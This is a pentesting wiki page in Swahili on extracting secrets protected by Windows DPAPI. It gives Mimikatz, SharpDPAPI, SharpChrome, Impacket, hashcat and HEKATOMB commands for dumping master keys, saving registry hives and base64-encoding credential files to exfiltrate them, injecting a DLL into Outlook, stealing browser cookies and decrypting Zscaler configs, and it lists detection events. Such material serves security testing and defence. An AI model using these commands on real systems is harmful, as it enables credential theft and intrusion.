# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa **usimbaji fiche linganifu wa funguo za faragha zisizolingana**, kwa kutumia siri za mtumiaji au za mfumo kama chanzo muhimu cha entropy. Mbinu hii hurahisisha usimbaji fiche kwa developers kwa kuwawezesha kusimba data kwa kutumia ufunguo unaotokana na siri za kuingia za mtumiaji au, kwa usimbaji fiche wa mfumo, siri za uthibitishaji wa domain za mfumo. Hivyo, developers hawahitaji kusimamia wenyewe ulinzi wa ufunguo wa usimbaji fiche.

Njia inayotumika zaidi kutumia DPAPI ni kupitia functions **`CryptProtectData` na `CryptUnprotectData`**, ambazo huruhusu applications kusimba na kufungua data kwa kutumia muktadha wa usalama wa process iliyoingia kwa sasa. Kwa chaguomsingi, data inaweza kufunguliwa tu na muktadha uleule wa mtumiaji au mfumo ulioisimba.<sup>[[2]](#references)[[3]](#references)</sup>

Functions hizi pia hupokea **entropy parameter** ya hiari inayotumika wakati wa usimbaji fiche na ufunguaji wa data. Data iliyolindwa kwa entropy ya hiari inahitaji thamani hiyo hiyo ya entropy ili ifunguliwe.<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI hutoa thamani mahususi kwa mtumiaji (mara nyingi huitwa **pre-key**) kutoka kwenye vitambulisho vya mtumiaji. Namna halisi ya kuipata hutegemea akaunti na toleo la mfumo wa uendeshaji. Kwa mfano, Impacket hujaribu njia ya HMAC-SHA1 inayotegemea digest ya SHA-1 ya nenosiri la UTF-16LE, njia nyingine inayotegemea MD4/NT hash ya nenosiri, na njia inayotumia PBKDF2-SHA256 kwa Protected Users. Hii ndiyo sababu zana za offline mara nyingi zinaweza kupata nyenzo inayohitajika kutoka kwenye nenosiri la maandishi ya kawaida au NT hash inayopatikana.<sup>[[2]](#references)[[10]](#references)</sup>

Hili linavutia hasa kwa sababu mshambuliaji akiweza kupata password hash ya mtumiaji, anaweza:

- **Kufungua data yoyote iliyosimbwa kwa kutumia DPAPI** kwa ufunguo wa mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **kupasua nenosiri** offline ili kupata ufunguo halali wa DPAPI

DPAPI hudumisha **master keys** moja au zaidi kwa kila mtumiaji badala ya kuunda master key mpya kwa kila blob iliyolindwa. Kila master key ina **GUID** (Globally Unique Identifier), na blob iliyosimbwa hurekodi master key iliyoilinda.<sup>[[2]](#references)</sup>

Master keys huhifadhiwa kwenye saraka ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji. Faili ya master key ina nyenzo zilizolindwa na **pre-key** ya mtumiaji na, kwa watumiaji wa domain, nyenzo za urejeshaji zilizolindwa na **domain backup key**.<sup>[[2]](#references)</sup>

Kumbuka kwamba **domain key inayotumika kusimba master key iko kwenye domain controllers na haibadiliki kamwe**, kwa hivyo mshambuliaji akiwa na ufikiaji wa domain controller, anaweza kupata domain backup key na kufungua master keys za watumiaji wote kwenye domain.<sup>[[2]](#references)</sup>

Blobs zilizosimbwa zina **GUID ya master key** iliyotumika kusimba data ndani ya headers zake.

> [!TIP]
> Blobs zilizosimbwa za DPAPI huanza na **`01 00 00 00`**

Tafuta master keys:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Hivi ndivyo kundi la Master Keys za mtumiaji linavyoonekana:

![What is DPAPI - Users key generation: Hivi ndivyo kundi la Master Keys za mtumiaji linavyoonekana](<../../images/image (1121).png>)

### Uzalishaji wa Machine/System key

Hii ni key inayotumiwa na mashine kusimba data kwa njia fiche. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum inayoweza kufikiwa na mtumiaji wa SYSTEM pekee. Key hii hutumiwa kusimba data inayohitaji kufikiwa na mfumo wenyewe, kama vile credentials za kiwango cha mashine au secrets za mfumo mzima.<sup>[[2]](#references)</sup>

Kumbuka kwamba keys hizi **hazina nakala rudufu ya domain**, kwa hivyo zinaweza kufikiwa ndani ya mashine pekee:

- **Mimikatz** inaweza kuifikia kwa kudump LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Secret imehifadhiwa ndani ya registry, kwa hivyo administrator anaweza **kurekebisha ruhusa za DACL ili kuifikia**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Uchimbaji wa offline kutoka kwa registry hives pia unawezekana. Kwa mfano, ukiwa administrator kwenye target, hifadhi hives na uzifanye exfiltrate:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Kisha, kwenye mashine yako ya uchanganuzi, pata tena siri ya DPAPI_SYSTEM LSA kutoka kwenye hives na uitumie kusimbua DPAPI blobs za machine-scope (kwa mfano, credentials za programu zilizolindwa na mashine au profiles za Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Mfano wa DPAPI maalum kwa Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Data Inayolindwa na DPAPI

Data binafsi zinazolindwa na DPAPI ni pamoja na:

- Vitambulisho vya Windows
- Nywila na data ya kujaza kiotomatiki ya Internet Explorer na Google Chrome
- Nywila za akaunti za barua pepe na FTP ya ndani za programu kama Outlook na Windows Mail
- Nywila za folda zilizoshirikiwa, rasilimali, mitandao isiyotumia waya na Windows Vault, zikiwemo funguo za usimbaji fiche
- Nywila za miunganisho ya kompyuta za mezani za mbali, .NET Passport na funguo binafsi kwa madhumuni mbalimbali ya usimbaji fiche na uthibitishaji
- Nywila za mtandao zinazosimamiwa na Credential Manager na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger na nyinginezo
- Blobs zilizosimbwa fiche ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Nywila za Wifi
- ...

Nywila za scheduled-task ni suala tofauti linalohusu LSA-secret. Task iliyosajiliwa kwa kutumia [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) inaweza kuhifadhi nywila kwa ajili ya kurejesha akaunti ya local administrator/SYSTEM; task ya S4U au interactive-token haithibitishi kwamba nywila ilihifadhiwa. Principal na logon type ya task ni viashiria thabiti zaidi kuliko jina lake la run-as pekee.

### Chaguo za kutoa master key

- Ikiwa mtumiaji ana haki za domain admin, anaweza kufikia **domain backup key** ili kusimbua master keys zote za watumiaji katika domain:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Ukiwa na haki za msimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa DPAPI master keys za watumiaji wote walioingia na key ya SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Ikiwa mtumiaji ana haki za admin za ndani, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kusimbua machine master keys:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Ikiwa nenosiri au hash ya NTLM ya mtumiaji inajulikana, unaweza **kusimbua master keys za mtumiaji moja kwa moja**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Ukiwa ndani ya session kama mtumiaji, unaweza kuiomba DC backup key ya ku-decrypt master keys kupitia RPC. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **kuiba session token yake** kwa hili:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Orodhesha Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Fikia Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

Faili zinazolindwa kwa watumiaji wa kawaida ziko kwenye:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia jaribu kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya enumeration:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizosimbwa kwa DPAPI kwenye mfumo wa faili, registry na blobs za B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Kumbuka kuwa [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka repo hiyo hiyo) inaweza kutumika kufanya decrypt ya data nyeti kwa kutumia DPAPI, kama vile cookies.<sup>[[12]](#references)</sup>

#### Mapishi ya haraka ya Chromium/Edge/Electron (SharpChrome)

- Mtumiaji wa sasa, kufanya decrypt kwa maingiliano ya saved logins/cookies (inafanya kazi hata kwa app-bound cookies za Chrome 127+ kwa sababu key ya ziada hutatuliwa kutoka kwa Credential Manager ya mtumiaji inapotekelezwa katika user context):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Uchambuzi wa offline unapokuwa na mafaili pekee. Kwanza toa ufunguo wa hali ya AES kutoka kwenye "Local State" ya profile, kisha uutumie kusimbua DB ya cookies:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Uchunguzi wa awali wa kikoa kizima/wa mbali ukiwa na ufunguo wa chelezo wa kikoa cha DPAPI (PVK) na admin kwenye host lengwa:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka kuvunja nenosiri na kusimbua moja kwa moja data ya wasifu:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Maelezo
- Matoleo mapya ya Chrome/Edge yanaweza kuhifadhi baadhi ya cookies kwa kutumia usimbaji fiche wa "App-Bound". Haiwezekani kusimbua cookies hizo mahususi nje ya mtandao bila app-bound key ya ziada; endesha SharpChrome katika muktadha wa mtumiaji lengwa ili kuipata kiotomatiki. Tazama chapisho la blogu ya usalama ya Chrome lililorejelewa hapa chini.<sup>[[5]](#references)</sup>

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa faili zilizosimbwa kwa DPAPI katika session ya sasa:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Pata taarifa za credentials** kama vile data iliyosimbwa na guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Fikia masterkeys**:

Decrypt masterkey ya mtumiaji kwa kuomba **domain backup key** kupitia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Zana ya **SharpDPAPI** pia inasaidia hoja hizi za kusimbua masterkey (kumbuka kwamba inawezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nenosiri la maandishi wazi, au `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI wa domain...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Fungua usimbaji wa data kwa kutumia masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Zana ya **SharpDPAPI** pia hutumia argument hizi kwa usimbuaji wa `credentials|vaults|rdg|keepass|triage|blob|ps` (ona jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nenosiri la maandishi wazi, `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI ya domain, `/unprotect` kutumia session ya sasa ya mtumiaji...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna nenosiri linalohitajika)

Ukiweza kudump LSASS, Mimikatz mara nyingi huonyesha DPAPI key ya kila logon, ambayo inaweza kutumika kusimbua masterkeys za mtumiaji bila kujua nenosiri la maandishi wazi. Pitisha thamani hii moja kwa moja kwenye tooling:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Fumbua usimbaji fiche wa baadhi ya data kwa kutumia **session ya mtumiaji wa sasa**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Usimbuaji fiche offline kwa kutumia Impacket dpapi.py

Ikiwa una SID na nenosiri la mtumiaji mwathiriwa (au NT hash), unaweza kusimbua masterkeys za DPAPI na blobs za Credential Manager ukiwa offline kabisa kwa kutumia dpapi.py ya Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts kwenye diski:
  - Blob(s) za Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha faili hazifanyi kazi vizuri, encode faili kama base64 kwenye host na unakili matokeo:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Decrypt masterkey kwa kutumia SID na password/hash ya mtumiaji:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Tumia masterkey iliyodecryptiwa kudekripti credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Workflow hii mara nyingi hurejesha credentials za domain zilizohifadhiwa na programu zinazotumia Windows Credential Manager, ikijumuisha akaunti za usimamizi (kwa mfano, `*_adm`).

---

### Kushughulikia Entropy ya Hiari ("Third-party entropy")

Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii, blob haiwezi kufutwa kwa decryption, hata ikiwa masterkey sahihi inajulikana. Kwa hivyo, kupata entropy ni muhimu wakati wa kulenga credentials zilizolindwa kwa njia hii (kwa mfano, Microsoft Outlook na baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayoweka hooks kwenye functions za DPAPI ndani ya process inayolengwa na kurekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kuendesha EntropyCapture katika hali ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayohusisha kila entropy buffer na process na blob iliyoiita. Entropy iliyonaswa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufuta data kwa decryption.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa masterkey wa **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) na **22102** (context 3), hivyo kuwezesha cracking inayotumia GPU ya nywila za watumiaji moja kwa moja kutoka kwenye faili ya masterkey. Kwa hiyo, washambuliaji wanaweza kutekeleza mashambulizi ya word-list au brute-force bila kuingiliana na mfumo lengwa.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) hujiendesha yenyewe katika mchakato huu:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Zana hii pia inaweza kuchanganua blobs za Credential na Vault, kuzifungua kwa kutumia keys zilizovunjwa na kutoa nywila za maandishi wazi.<sup>[[8]](#references)</sup>


### Kufikia data ya mashine nyingine

Katika **SharpDPAPI and SharpChrome**, unaweza kubainisha chaguo la **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kuwa **domain backup encryption key inajulikana**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### Muunganisho wa database ya seva ya ripoti ya SSRS

Kwenye host ya SQL Server Reporting Services (SSRS), `RSReportServer.config` inaweza kuwa na `<Dsn>` iliyosimbwa kwa database ya seva ya ripoti.<sup>[[15]](#references)</sup> SSRS hulinda mipangilio hii ya muunganisho kwa kutumia **ufunguo wa kiwango cha mashine ya ndani**; badala yake, vitambulisho vya vyanzo vya data vya ripoti za nje husimbwa kwenye database ya seva ya ripoti kwa kutumia ufunguo wake linganifu.<sup>[[14]](#references)</sup>

Katika kisa kilichoripotiwa, mshambuliaji alitoa `Dsn` na kujaribu kusimbua bytes zake zilizotolewa kutoka Base64 kwa kutumia `ProtectedData.Unprotect` na scope ya `LocalMachine`.<sup>[[13]](#references)</sup>

Ukiwa na ruhusa ya kusoma faili ya usanidi ya SSRS kwenye mashine iliyoisimba, tafuta njia halisi ya instance na ukague thamani hiyo. Njia ya mfano ni ya SSRS 2017 na matoleo ya baadaye; ulinzi wa kiwango cha mashine hauhitaji muktadha wa akaunti ya huduma ya SSRS.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

`Dsn` ikiwa tupu au haipo, njia hii haina chochote cha kusimbua.<sup>[[15]](#references)</sup> Mfuatano wa muunganisho uliosimbuliwa **si lazima** uwe na nenosiri linaloweza kutumiwa tena: SSRS inaweza kutumia akaunti yake ya huduma, au akaunti ya domain iliyosanidiwa inaweza kuwa na mipangilio tofauti ya `LogonUser`, `LogonDomain`, na `LogonCred`.<sup>[[15]](#references)</sup> Kunakili thamani iliyosimbwa kwa mashine nyingine hakuipi mashine hiyo ufunguo wa ulinzi wa host ilikotoka.<sup>[[14]](#references)</sup>

Kwa njia nyingine za kufikia SQL Server, tazama [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/).

## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayofanya kiotomatiki uchimbaji wa users na computers wote kutoka kwenye LDAP directory na uchimbaji wa ufunguo wa hifadhi rudufu wa domain controller kupitia RPC. Kisha script hutatua anwani za IP za computers zote na kutekeleza smbclient kwenye kila computer ili kupata DPAPI blobs zote za users na kusimbua kila kitu kwa kutumia ufunguo wa hifadhi rudufu wa domain.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Ukiwa na orodha ya computers zilizochukuliwa kutoka LDAP, unaweza kupata kila sub network hata kama hukuijua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kumwaga secrets zilizolindwa na DPAPI kiotomatiki. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya hosts
* Uchanganuzi wa masterkeys za **context 3** na muunganisho wa kiotomatiki wa Hashcat cracking
* Usaidizi wa cookies zilizosimbwa za Chrome "App-Bound" (tazama sehemu inayofuata)
* Hali mpya ya **`--snapshot`** ya kuuliza endpoints mara kwa mara na kutambua tofauti za blobs zilizoundwa hivi karibuni

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# ya faili za masterkey/credential/vault inayoweza kutoa miundo ya Hashcat/JtR na, kwa hiari, kuanzisha cracking kiotomatiki. Inaauni kikamilifu miundo ya masterkey za machine na user hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Ugunduzi wa kawaida

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
    - Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kufikia kumbukumbu ya LSASS au kumwaga masterkeys.
- Event **4662**: *Operesheni ilifanywa kwenye object* – inaweza kuhusishwa na ufikiaji wa object ya **`BCKUPKEY`**.
- Event **4673/4674** mchakato unapoomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Udhaifu na mabadiliko ya mfumo wa zana za 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambulizi mwenye ufikiaji wa mtandao angeweza kumdanganya mwanachama wa domain apate ufunguo hasidi wa hifadhi rudufu wa DPAPI, na hivyo kuruhusu kusimbua masterkeys za users. Ilirekebishwa katika sasisho limbikizi la Novemba 2023 – wasimamizi wanapaswa kuhakikisha DC na workstations zimesasishwa kikamilifu.<sup>[[4]](#references)</sup>
* **Usimbaji fiche wa cookies wa Chrome 127 “App-Bound”** (Julai 2024) ulibadilisha ulinzi wa zamani wa DPAPI pekee na kuongeza ufunguo unaohifadhiwa kwenye **Credential Manager** ya user. Kusimbua cookies bila kutumia mtandao sasa kunahitaji masterkey ya DPAPI na **ufunguo wa app-bound uliofungwa kwa GCM**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurejesha ufunguo huo wa ziada zinapoendeshwa katika muktadha wa user.<sup>[[5]](#references)</sup>


### Uchunguzi wa Kesi: Zscaler Client Connector – Entropy Maalum Inayotokana na SID

Zscaler Client Connector huhifadhi faili kadhaa za usanidi katika `C:\ProgramData\Zscaler` (kwa mfano, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili husimbwa kwa **DPAPI (Machine scope)** lakini vendor hutoa **entropy maalum** ambayo *hukokotolewa wakati wa utekelezaji* badala ya kuhifadhiwa kwenye diski.<sup>[[1]](#references)</sup>

Entropy huundwa upya kutokana na vipengele viwili:

1. Secret iliyowekwa ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya akaunti ya Windows ambayo usanidi unahusiana nayo.

Algorithm iliyotekelezwa na DLL ni sawa na:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Kwa kuwa siri imepachikwa ndani ya DLL inayoweza kusomwa kutoka kwenye diski, **mshambulizi yeyote wa ndani mwenye haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na kusimbua blobs bila kuunganishwa na mfumo:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Kusimbua hutoa usanidi kamili wa JSON, ikijumuisha kila **ukaguzi wa posture ya kifaa** na thamani yake inayotarajiwa — taarifa yenye thamani kubwa sana unapojaribu client-side bypasses.

> TIP: artefact nyingine zilizosimbwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (baiti `16` zenye thamani sifuri). Kwa hiyo, zinaweza kusimbuliwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu marupurupu ya SYSTEM yanapopatikana.

## References

- [1] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita ukaguzi wa posture wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Siri za DPAPI. Uchambuzi wa usalama na urejeshaji wa data katika DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Kusoma siri zilizosimbwa kwa DPAPI kwa kutumia Mimikatz na C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
